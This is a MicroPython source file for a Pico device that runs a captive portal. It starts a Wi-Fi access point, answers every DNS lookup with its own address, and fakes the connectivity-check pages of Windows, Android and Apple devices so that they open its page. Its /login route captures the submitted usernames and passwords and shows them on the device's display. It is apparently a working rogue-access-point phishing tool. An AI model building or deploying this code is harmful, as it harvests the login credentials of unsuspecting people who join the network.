# =============================================================================
#  Project: Pico Portal
#  License: CC-BY-NC-4.0
#  Repository: https://github.com/CodyTolene/Pico-Portal
#  Description: A service to handle the portal functionality for the Pico
#  Portal device. This service will start an access point, DNS server, and web
#  server to allow users to connect to the device to be served web content.
# =============================================================================

import uasyncio # type: ignore
import sys

# Third party packages
from modules.phew import access_point, dns, server
from modules.phew.server import redirect
from modules.phew.template import render_template

# Local packages
from services.messages_service import MessagesService
from services.options_service import OptionKeys, OptionsService

# Ensure packages can be imported
sys.path.append("../modules")
sys.path.append("../services")

class PortalService:
    def __init__(self, options: OptionsService, messages: MessagesService):
        # Dependencies
        self.messages = messages

        # Properties
        self.domain = options.get_option(OptionKeys.WIFI_DOMAIN)
        self.password = options.get_option(OptionKeys.WIFI_PASSWORD)
        self.ssid = options.get_option(OptionKeys.WIFI_SSID)
        self.ip = None

        # Initialization
        self.register_routes()
    
    async def start_access_point(self):
        await self.messages.display("Starting Access Point...")
        ap = access_point(self.ssid, self.password)
        await self.messages.display(f"AP \"{ self.ssid }\" started...")
        await self.messages.display(f"AP Password: {self.password if self.password else 'None'}")
        self.ip = ap.ifconfig()[0]
        await self.messages.display(f"AP IP: {self.ip}")

    async def start_dns_server(self):
        await self.messages.display("Starting DNS server...")
        await self.messages.display(f"Domain Name: {self.domain}")

        if self.ip:
            dns.run_catchall(self.ip)
            await self.messages.display("DNS server started...")
        else:
            await self.messages.display("Error: Access Point not started")
            raise Exception("Access Point not started")

    async def start_web_server(self):
        await self.messages.display("Web Server started...")
        server.run()

    async def run(self):
        try:
            await self.start_access_point()
            await self.start_dns_server()
            await self.start_web_server()
        except Exception as e:
            await self.messages.display(f"Error: {e}")

    def register_routes(self):
        @server.route("/", methods=["GET"])
        def index(request):
            return render_template("templates/index.html")

        @server.route("/success", methods=["GET"])
        def success(request):
            return render_template("templates/success.html")

        @server.route("/connecttest.txt", methods=["GET"])
        def connecttest(request):
            return "", 200

        @server.route("/ncsi.txt", methods=["GET"])
        def ncsi(request):
            return "", 200

        @server.route("/generate_204", methods=["GET"])
        def android(request):
            return redirect(f"http://{self.domain}/", 302)

        @server.route("/hotspot-detect.html", methods=["GET"])
        def apple(request):
            return render_template("templates/index.html")

        @server.route("/login", methods=["GET"])
        def login(request):
            username = request.query.get("username")
            password = request.query.get("password")
            uasyncio.create_task(
                self.messages.display(f"Login U: {username} P: {password}")
            )
            return redirect(f"http://{self.domain}/success")

        @server.route("/<path>", methods=["GET"])
        def catch_all(request, path):
            return redirect(f"http://{self.domain}/")
